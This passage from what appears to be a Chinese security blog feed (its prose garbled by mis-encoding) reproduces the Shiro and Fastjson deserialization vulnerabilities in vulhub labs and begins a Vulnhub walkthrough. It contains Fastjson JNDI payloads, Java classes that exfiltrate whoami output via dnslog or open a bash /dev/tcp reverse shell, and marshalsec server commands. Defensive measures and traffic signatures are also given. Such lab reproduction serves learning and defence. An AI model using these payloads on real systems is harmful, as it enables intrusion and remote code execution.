è®¤è¯</p><h1 id="å››ã€ä¸Šçº¿ä¸å‡ºç½‘Shiroååºåˆ—åŒ–"><a href="#å››ã€ä¸Šçº¿ä¸å‡ºç½‘Shiroååºåˆ—åŒ–" class="headerlink" title="å››ã€ä¸Šçº¿ä¸å‡ºç½‘Shiroååºåˆ—åŒ–"></a>å››ã€ä¸Šçº¿ä¸å‡ºç½‘Shiroååºåˆ—åŒ–</h1><p>Shiroååºåˆ—åŒ–æ£€æµ‹è„šæœ¬ï¼š<a href="https://github.com/zhzyker/shiro-1.2.4-rce">https://github.com/zhzyker/shiro-1.2.4-rce</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro-1.2.4_rce.py http://1.1.1.1:8080</span><br></pre></td></tr></table></figure><p>ä¹‹åæ‰§è¡Œåå¼¹shellï¼Œç”¨ncç›‘å¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.109.9/8889 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h1 id="äº”ã€é˜²å¾¡æªæ–½"><a href="#äº”ã€é˜²å¾¡æªæ–½" class="headerlink" title="äº”ã€é˜²å¾¡æªæ–½"></a>äº”ã€é˜²å¾¡æªæ–½</h1><ul><li>åŠæ—¶å‡çº§shiroç‰ˆæœ¬ï¼Œä¸å†ä½¿ç”¨å›ºå®šçš„å¯†é’¥åŠ å¯†ã€‚</li><li>åœ¨åº”ç”¨ç¨‹åºä¸Šéƒ¨ç½²é˜²ç«å¢™ã€åŠ å¼ºèº«ä»½éªŒè¯ç­‰æªæ–½ä»¥æé«˜å®‰å…¨æ€§</li><li>å¦‚æœç¨‹åºä¸éœ€è¦RememberMeåŠŸèƒ½ï¼Œåˆ™å®Œå…¨å¯ä»¥ç¦ç”¨å®ƒ</li></ul><h1 id="å…­ã€shrio550å’Œ721çš„åŒºåˆ«"><a href="#å…­ã€shrio550å’Œ721çš„åŒºåˆ«" class="headerlink" title="å…­ã€shrio550å’Œ721çš„åŒºåˆ«"></a>å…­ã€shrio550å’Œ721çš„åŒºåˆ«</h1><ol><li>ä¸»è¦åŒºåˆ«åœ¨äºShiro550 çš„AES åŠ å¯†çš„keyä½¿ç”¨å·²çŸ¥å¯†é’¥</li><li>Shiro721çš„AES åŠ å¯†çš„keyä¸ºç³»ç»Ÿéšæœºç”Ÿæˆï¼Œéœ€è¦åˆ©ç”¨ç™»å½•åçš„rememberMe å»çˆ†ç ´æ­£ç¡®çš„keyå€¼ã€‚åˆ©ç”¨æœ‰æ•ˆçš„RememberMe Cookieä½œä¸ºPadding Oracle Attack çš„å‰ç¼€ï¼Œå†å»æ„é€ ååºåˆ—åŒ–æ”»å‡»ã€‚</li><li>Shiro åœ¨ 1.4.2 ç‰ˆæœ¬ä¹‹å‰ï¼ŒAES åŠ å¯†æ¨¡å¼ä¸º CBCã€‚åœ¨ 1.4.2 ç‰ˆæœ¬åï¼ŒShiro å·²ç»æ›´æ¢åŠ å¯†æ¨¡å¼ AES-CBC ä¸º AES-GCMï¼Œè„šæœ¬ç¼–å†™æ—¶éœ€è¦è€ƒè™‘åŠ å¯†æ¨¡å¼å˜åŒ–çš„æƒ…å†µ</li></ol><h1 id="ä¸ƒã€Shiro-æ”»å‡»æµé‡ç‰¹å¾"><a href="#ä¸ƒã€Shiro-æ”»å‡»æµé‡ç‰¹å¾" class="headerlink" title="ä¸ƒã€Shiro æ”»å‡»æµé‡ç‰¹å¾"></a>ä¸ƒã€Shiro æ”»å‡»æµé‡ç‰¹å¾</h1><ol><li>è¯·æ±‚åŒ…Cookieçš„rememberMeä¸­ä¼šå­˜åœ¨AES+base64åŠ å¯†çš„ä¸€ä¸²javaååºåˆ—åŒ–ä»£ç ã€‚</li><li>å“åº”å¤´å­˜åœ¨<code>Set-Cookieï¼šrememberMe=deleteMe</code></li><li>å“åº”åŒ…ä¸­å­˜åœ¨base64åŠ å¯†æ•°æ®ï¼Œè¯¥æ•°æ®å¯ä½œä¸ºæ”»å‡»æˆåŠŸçš„åˆ¤å®šæ¡ä»¶ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> å¤ç°ä¸å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æ¼æ´å¤ç°ã€‘Fastjson ç³»åˆ—ååºåˆ—åŒ–æ¼æ´å¤ç°</title>
      <link href="/2024/02/26/VulnRep-Fastjson/"/>
      <url>/2024/02/26/VulnRep-Fastjson/</url>
      
        <content type="html"><![CDATA[<h1 id="é›¶ã€Fastjson-ç®€ä»‹"><a href="#é›¶ã€Fastjson-ç®€ä»‹" class="headerlink" title="é›¶ã€Fastjson ç®€ä»‹"></a>é›¶ã€Fastjson ç®€ä»‹</h1><p>Fastjson æ˜¯ç”±é˜¿é‡Œå·´å·´å¼€æºçš„ä¸€ä¸ª Java åº“ï¼Œç”¨äºå¤„ç† JSON æ•°æ®æ ¼å¼çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œä½†æ˜¯åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰ä½¿ç”¨Java è‡ªå¸¦çš„åºåˆ—åŒ–æœºåˆ¶ï¼Œè€Œæ˜¯è‡ªå®šä¹‰äº†ä¸€å¥—æœºåˆ¶ã€‚åŒæ—¶å®ƒå› ä¸ºæ€§èƒ½ä¼˜å¼‚è€Œåœ¨ Java å¼€å‘è€…ä¸­å¹¿å—æ¬¢è¿ã€‚ç„¶è€Œï¼ŒFastjson åœ¨å¤„ç†ååºåˆ—åŒ–æ“ä½œæ—¶å­˜åœ¨ä¸€äº›å®‰å…¨é—®é¢˜ï¼Œè¿™äº›é—®é¢˜å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ç­‰ä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚</p><p>ç»¼åˆæ¥çœ‹ï¼Œæ¼æ´é€ æˆçš„åŸå› å¦‚ä¸‹ï¼š</p><ol><li>AutoType åŠŸèƒ½ï¼šFastjson å¼•å…¥äº†AutoType åŠŸèƒ½ï¼ˆè‡ªåŠ¨ç±»å‹ï¼Œæ”¯æŒè‡ªçœï¼‰ï¼Œå¼€å¯è¯¥åŠŸèƒ½ååœ¨JSON åºåˆ—åŒ–ä¹‹åçš„æ•°æ®ä¸­å¤šäº†ä¸€ä¸ª @type å­—æ®µã€‚è¯¥å­—æ®µå¯ä»¥æŒ‡å®šååºåˆ—åŒ–çš„ç›®æ ‡ç±»å‹ï¼Œå…è®¸åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœªçŸ¥ç±»å‹çš„ Java å¯¹è±¡ã€‚</li><li>å®‰å…¨é£é™©ï¼šå½“ Fastjson å¤„ç†åŒ…å« @type å­—æ®µçš„ JSON æ•°æ®æ—¶ï¼Œå®ƒä¼šå°è¯•æ ¹æ®æŒ‡å®šçš„ç±»å‹åˆ›å»ºå¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ä¸­æ»¡è¶³æ¡ä»¶çš„getteræˆ–è€…setterçš„æ–¹æ³•ï¼Œå¯¼è‡´å®‰å…¨æ¼æ´ã€‚</li><li>åˆ©ç”¨é“¾ï¼šæ”»å‡»è€…å¯ä»¥æ„é€ ç‰¹å®šçš„ JSON æ•°æ®ï¼Œé€šè¿‡ @type å­—æ®µæŒ‡å®šä¸€ä¸ªå­˜åœ¨å®‰å…¨æ¼æ´çš„ç±»ã€‚åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼ŒFastjson ä¼šåŠ è½½å¹¶æ‰§è¡Œè¿™ä¸ªç±»ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„ä»£ç ã€‚</li><li>JNDI æ³¨å…¥åˆ©ç”¨ï¼šä¸€äº›å·²çŸ¥çš„ Fastjson æ¼æ´åˆ©ç”¨äº† RMIï¼ˆè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰å’Œ LDAPï¼ˆJava å‘½åå’Œç›®å½•æ¥å£ï¼‰åŠŸèƒ½ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡è¿™äº›æ¥å£è¿œç¨‹æ‰§è¡Œä»£ç ï¼Œç”šè‡³åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºåé—¨ã€‚</li><li>ä¿®å¤å†ç¨‹ï¼šFastjson 1.2.24æå‡ºæ¥AutoType åŠŸèƒ½ï¼Œå…è®¸è‡ªå®šä¹‰æŒ‡å®šååºåˆ—åŒ–ç›®æ ‡ç±»å‹ï¼›1.2.25å¢åŠ äº†<code>checkAutoType()</code>å‡½æ•°ï¼Œé‡‡ç”¨é»‘ç™½åå•çš„æ–¹å¼å¯¹ç›®æ ‡ç±»å‹è¿›è¡Œé™åˆ¶ï¼›ä»1.2.25ä¹‹åçš„æ¼æ´åˆ©ç”¨ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯å›´ç»•ç»•è¿‡<code>checkAutoType()</code>å‡½æ•°é»‘åå•å±•å¼€çš„ã€‚</li></ol><h1 id="ä¸€ã€Fastjson-æ¡†æ¶å’Œç‰ˆæœ¬åˆ¤æ–­"><a href="#ä¸€ã€Fastjson-æ¡†æ¶å’Œç‰ˆæœ¬åˆ¤æ–­" class="headerlink" title="ä¸€ã€Fastjson æ¡†æ¶å’Œç‰ˆæœ¬åˆ¤æ–­"></a>ä¸€ã€Fastjson æ¡†æ¶å’Œç‰ˆæœ¬åˆ¤æ–­</h1><h2 id="1ã€åˆ¤æ–­fastjson-æ¡†æ¶å’Œç‰ˆæœ¬"><a href="#1ã€åˆ¤æ–­fastjson-æ¡†æ¶å’Œç‰ˆæœ¬" class="headerlink" title="1ã€åˆ¤æ–­fastjson æ¡†æ¶å’Œç‰ˆæœ¬"></a>1ã€åˆ¤æ–­fastjson æ¡†æ¶å’Œç‰ˆæœ¬</h2><p>1ã€æ–¹æ³•ä¸€ï¼šè¿”å›é¡µé¢åˆ¤æ–­</p><p>è¿™é‡Œæ£€æµ‹çš„æ˜¯1.2.47ç‰ˆæœ¬ï¼Œä½†æ˜¯é’ˆå¯¹1.2.24ç‰ˆæœ¬çš„è¯æ˜¯æ²¡æœ‰å›æ˜¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;b&#123;</span><br><span class="line">æˆ–</span><br><span class="line">&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å•æœ‰æŠ¥é”™ï¼Œå´æ²¡æœ‰å›æ˜¾ç‰ˆæœ¬ä¿¡æ¯å±äº1.2.47ä¹‹å‰çš„ç‰ˆæœ¬</p><p><img src="/img/VulnRep-Fastjson/image-20240310140409923.png" alt="image-20240310140409923"></p><p>è¿™æ ·æ—¢æœ‰é”™è¯¯é¡µé¢ä¹Ÿè¿”å›äº†fastjson çš„ç‰ˆæœ¬ä¿¡æ¯å±äº1.2.47ä¹‹å</p><p><img src="/img/VulnRep-Fastjson/image-20240310140507668.png" alt="image-20240310140507668"></p><h1 id="äºŒã€Fastjson-1-2-24-RCE-ååºåˆ—åŒ–æ¼æ´å¤ç°"><a href="#äºŒã€Fastjson-1-2-24-RCE-ååºåˆ—åŒ–æ¼æ´å¤ç°" class="headerlink" title="äºŒã€Fastjson 1.2.24-RCE ååºåˆ—åŒ–æ¼æ´å¤ç°"></a>äºŒã€Fastjson 1.2.24-RCE ååºåˆ—åŒ–æ¼æ´å¤ç°</h1><h2 id="1ã€æ¼æ´åŸå› "><a href="#1ã€æ¼æ´åŸå› " class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h2><ol><li>Fastjson1.2.24æ”¯æŒçš„åˆ©ç”¨é“¾æœ‰Templateslmpl å’Œ JdbcRowSetlmpl</li><li>JdbcRowSetImpl åˆ©ç”¨é“¾å°±æ˜¯é€ æˆçš„JNDIæ³¨å…¥ï¼Œå…¶ä¸­sunå®˜æ–¹æä¾›çš„ä¸€ä¸ªç±»com.sun.rowset.JdbcRowSetImplï¼Œå…¶ä¸­æœ‰ä¸ªdataSourceNameæ–¹æ³•æ”¯æŒä¼ å…¥ä¸€ä¸ªrmiçš„æºï¼Œåªè¦è§£æå…¶ä¸­çš„urlå°±ä¼šæ”¯æŒè¿œç¨‹è°ƒç”¨</li></ol><h2 id="2ã€å½±å“ç‰ˆæœ¬"><a href="#2ã€å½±å“ç‰ˆæœ¬" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h2><ul><li>1.2.22 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.24</li></ul><h2 id="3ã€æ¼æ´å¤ç°"><a href="#3ã€æ¼æ´å¤ç°" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h2><h3 id="1ã€ç¯å¢ƒé…ç½®"><a href="#1ã€ç¯å¢ƒé…ç½®" class="headerlink" title="1ã€ç¯å¢ƒé…ç½®"></a>1ã€ç¯å¢ƒé…ç½®</h3><p>æˆ‘ä»¬é‡‡ç”¨docker è¿›è¡Œéƒ¨ç½²</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub/fastjson/1.2.24-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Fastjson/image-20240226144903359.png" alt="image-20240226144903359"></p><p>è®¿é—®é¶æœºçš„8091ç«¯å£</p><p><img src="/img/VulnRep-Fastjson/image-20240226144959732.png" alt="image-20240226144959732"></p><p>é€šè¿‡BPæŠ“åŒ…æ„é€ jsonæ•°æ®</p><p><img src="/img/VulnRep-Fastjson/image-20240226145541569.png" alt="image-20240226145541569"></p><p>é¡µé¢æŠ¥é”™ï¼Œå¹¶æœªæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ï¼Œåˆ¤æ–­ä¸º1.2.47ç‰ˆæœ¬ä»¥ä¸‹</p><h3 id="2ã€Dnslogå¹³å°å‘½ä»¤å›æ˜¾"><a href="#2ã€Dnslogå¹³å°å‘½ä»¤å›æ˜¾" class="headerlink" title="2ã€Dnslogå¹³å°å‘½ä»¤å›æ˜¾"></a>2ã€Dnslogå¹³å°å‘½ä»¤å›æ˜¾</h3><p>æ„é€ ä¸€ä¸ªjavaç±»ï¼Œæ‰§è¡Œping å‘½ä»¤ï¼Œé‡‡ç”¨dnslog å›æ˜¾å¹³å°è¿›è¡Œå‘½ä»¤å›æ˜¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class dnslog&#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123; &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;ping user.`whoami`.ccnfcs.dnslog.cn&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // æŠ¥é”™ä¿¡æ¯</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Fastjson/image-20240226150343584.png" alt="image-20240226150343584"></p><p>ä½¿ç”¨javac è¿›è¡Œç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac dnslog.java</span><br></pre></td></tr></table></figure><p>å°†ç¼–è¯‘å¥½çš„.class æ–‡ä»¶æ”¾åœ¨å…¬ç½‘æœåŠ¡å™¨ä¸Šï¼Œå¹¶é€šè¿‡py3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><p>å®‰è£…marshalsecï¼ˆç”¨æ¥å¼€å¯rmi æœåŠ¡ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mbechler/marshalsec.git</span><br><span class="line">cd marshalsec/</span><br><span class="line">mvn clean package -DskipTests</span><br><span class="line">cd target/</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://(å¯åŠ¨pythonæœåŠ¡çš„ip):(å¯åŠ¨pythonæœåŠ¡çš„ç«¯å£)/#&lt;ç±»åå¦‚dnslog&gt; 9999</span><br></pre></td></tr></table></figure><p>å¯åŠ¨æœåŠ¡ï¼Œå¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.20.139:8000/#dnslog&quot; 9999</span><br></pre></td></tr></table></figure><p>æ¼æ´åˆ©ç”¨ï¼Œbpæäº¤å¦‚ä¸‹jsonæ ¼å¼ï¼ˆä¸åŒç‰ˆæœ¬åˆ©ç”¨å§¿åŠ¿çš„POCä¸åŒï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.20.139:9999/dnslog&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨dnslog å¹³å°å°†ä¼šå¾—åˆ°å‘½ä»¤å›æ˜¾</p><h3 id="3ã€åå¼¹shell"><a href="#3ã€åå¼¹shell" class="headerlink" title="3ã€åå¼¹shell"></a>3ã€åå¼¹shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class ExpLinux &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        String[] cmd = &#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/&lt;vps_ip&gt;/&lt;port&gt; 0&gt;&amp;1&quot;&#125;;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å¹¶æ‹¿åˆ°æ¶æ„ç±»çš„<code>ExpLinux.class</code>æ–‡ä»¶ï¼Œå¼€å¯ http æœåŠ¡ï¼Œå†åˆ©ç”¨marshalsec å¼€å¯JNDI æœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br><span class="line"> </span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://&lt;vps_ip&gt;:8000/#ExpLinux 9999</span><br></pre></td></tr></table></figure><p>æäº¤å¦‚ä¸‹æ ¼å¼ï¼Œncç›‘å¬bash å³å°†åå¼¹çš„portï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://43.143.15.244:9999/ExpLinux&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ä¸‰ã€Fastjson-1-2-47-RCE-æ¼æ´å¤ç°"><a href="#ä¸‰ã€Fastjson-1-2-47-RCE-æ¼æ´å¤ç°" class="headerlink" title="ä¸‰ã€Fastjson 1.2.47-RCE æ¼æ´å¤ç°"></a>ä¸‰ã€Fastjson 1.2.47-RCE æ¼æ´å¤ç°</h1><h2 id="1ã€æ¼æ´åŸå› -1"><a href="#1ã€æ¼æ´åŸå› -1" class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h2><p>æœ¬æ¬¡Fastjsonååºåˆ—åŒ–æ¼æ´ä¹Ÿæ˜¯åŸºäº<code>checkAutoType()</code>å‡½æ•°ç»•è¿‡çš„ï¼Œå¹¶ä¸”<strong>æ— éœ€å¼€å¯AutoTypeSupport</strong>ï¼Œå¤§å¤§æé«˜äº†æˆåŠŸåˆ©ç”¨çš„æ¦‚ç‡ã€‚</p><p>ç»•è¿‡çš„å¤§ä½“æ€è·¯æ˜¯é€šè¿‡ java.lang.Classï¼Œå°†JdbcRowSetImplç±»åŠ è½½åˆ°Mapä¸­ç¼“å­˜ï¼Œä»è€Œç»•è¿‡AutoTypeçš„æ£€æµ‹ã€‚å› æ­¤å°†payloadåˆ†ä¸¤æ¬¡å‘é€ï¼Œç¬¬ä¸€æ¬¡åŠ è½½ï¼Œç¬¬äºŒæ¬¡æ‰§è¡Œã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œåªè¦é‡åˆ°æ²¡æœ‰åŠ è½½åˆ°ç¼“å­˜çš„ç±»ï¼Œ<code>checkAutoType()</code>å°±ä¼šæŠ›å‡ºå¼‚å¸¸ç»ˆæ­¢ç¨‹åºã€‚</p><p>æœ‰ä¸€ä¸ªç¨å¾®çš„æ³¨æ„ç‚¹ï¼Œå¦‚æœç›®æ ‡æœåŠ¡ç«¯å¼€å¯äº†AutoTypeSupportå‘¢ï¼Ÿç»æµ‹è¯•æ€»ç»“å¦‚ä¸‹ï¼š</p><ul><li>1.2.25-1.2.32ç‰ˆæœ¬ï¼šæœªå¼€å¯AutoTypeSupportæ—¶èƒ½æˆåŠŸåˆ©ç”¨ï¼Œå¼€å¯AutoTypeSupportåè€Œä¸èƒ½æˆåŠŸè§¦å‘ï¼›</li><li>1.2.33-1.2.47ç‰ˆæœ¬ï¼šæ— è®ºæ˜¯å¦å¼€å¯AutoTypeSupportï¼Œéƒ½èƒ½æˆåŠŸåˆ©ç”¨ï¼›</li></ul><h2 id="2ã€å½±å“ç‰ˆæœ¬-1"><a href="#2ã€å½±å“ç‰ˆæœ¬-1" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h2><p>Fastjson 1.2.47 ä»¥åŠä¹‹å‰çš„æ‰€æœ‰ç‰ˆæœ¬éƒ½å—åˆ°äº†è¿™ä¸ªæ¼æ´çš„å½±å“ã€‚</p><h2 id="3ã€æ¼æ´å¤ç°-1"><a href="#3ã€æ¼æ´å¤ç°-1" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h2><p>ç¯å¢ƒæ­å»ºç”¨BPæŠ“åŒ…æµ‹è¯•</p><p><img src="/img/VulnRep-Fastjson/image-20240226170304593.png" alt="image-20240226170304593"></p><p>è¿”å›æ•°æ®ä¸­å­˜åœ¨fastjson ç‰ˆæœ¬ä¿¡æ¯</p><p>åªéœ€è¦æ›´æ”¹æœ€åçš„payloadå³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.20.139:9999/dnslog&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å››ã€é˜²å¾¡æªæ–½"><a href="#å››ã€é˜²å¾¡æªæ–½" class="headerlink" title="å››ã€é˜²å¾¡æªæ–½"></a>å››ã€é˜²å¾¡æªæ–½</h1><ul><li>å‡çº§Fastjsonåˆ°ä¿®å¤äº†è¯¥æ¼æ´çš„ç‰ˆæœ¬ã€‚</li><li>å…³é—­Fastjsonçš„autoType æ”¯æŒï¼Œæˆ–è€…åœ¨ä»£ç ä¸­å¯¹ååºåˆ—åŒ–çš„æ•°æ®è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ã€‚</li><li>ä½¿ç”¨IP çš„é»‘ç™½åå•æ§åˆ¶è®¿é—®</li><li>è¿›è¡Œç›‘æ§å’Œæ—¥å¿—è®°å½•</li></ul>]]></content>
      
      
      <categories>
          
          <category> å¤ç°ä¸å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Vulnhubç³»åˆ—ã€‘Vulnhubé¶åœº_Dr4g0n b4ll</title>
      <link href="/2024/02/24/Vulnhub-Dr4g0n-b4ll/"/>
      <url>/2024/02/24/Vulnhub-Dr4g0n-b4ll/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-Dr4g0n-b4llé¶åœºæ¸—é€"><a href="#ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-Dr4g0n-b4llé¶åœºæ¸—é€" class="headerlink" title="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub_Dr4g0n b4llé¶åœºæ¸—é€"></a>ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub_Dr4g0n b4llé¶åœºæ¸—é€</h1><h1 id="ä¸€ã€ç¯å¢ƒæ­å»º"><a href="#ä¸€ã€ç¯å¢ƒæ­å»º" class="headerlink" title="ä¸€ã€ç¯å¢ƒæ­å»º"></a>ä¸€ã€ç¯å¢ƒæ­å»º</h1><p>é€‰æ‹©æ‰“å¼€.ovf æ–‡ä»¶</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224152423286.png" alt="image-20240224152423286"></p><p>é…ç½®åç§°å’Œè·¯å¾„</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224152402352.png" alt="image-20240224152402352"></p><p>æ‰“å¼€åè°ƒæ•´ç½‘ç»œè¿æ¥æ¨¡å¼ä¸ºã€NATã€‘å³å¯</p><h1 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h1><h3 id="1ã€ä¸»æœºå‘ç°"><a href="#1ã€ä¸»æœºå‘ç°" class="headerlink" title="1ã€ä¸»æœºå‘ç°"></a>1ã€ä¸»æœºå‘ç°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sn 192.168.31.*</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224135014762.png" alt="image-20240224135014762"></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" 